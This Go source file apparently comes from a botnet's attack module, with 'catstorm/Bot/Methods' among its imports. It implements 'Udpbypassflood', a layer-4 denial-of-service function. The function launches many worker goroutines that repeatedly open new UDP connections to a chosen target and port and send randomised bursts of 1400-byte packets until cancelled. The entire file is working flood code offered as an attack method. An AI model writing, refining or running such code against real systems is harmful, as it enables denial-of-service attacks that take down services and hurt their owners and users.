package l4

import (
	"context"
	"net"
	"time"
	"catstorm/Bot/Methods"
)

func Udpbypassflood(ctx context.Context, target, port string, duration int) {
	raddr, err := net.ResolveUDPAddr("udp", target+":"+port)
	if err != nil {
		return
	}

	n := methods.Workers()

	for i := 0; i < n; i++ {
		go func() {
			rng := methods.NewXorShift64()
			var bufs [16][]byte
			for i := range bufs {
				bufs[i] = make([]byte, 1400)
				rng.Fill(bufs[i])
			}
			idx := uint64(0)
			for {
				select {
				case <-ctx.Done():
					return
				default:
					conn, err := net.DialUDP("udp", nil, raddr)
					if err != nil {
						time.Sleep(5 * time.Millisecond)
						continue
					}
					burst := 3 + int(rng.Uint64()%18)
					for j := 0; j < burst; j++ {
						conn.Write(bufs[idx%16])
						idx++
					}
					conn.Close()
				}
			}
		}()
	}

	<-ctx.Done()
}
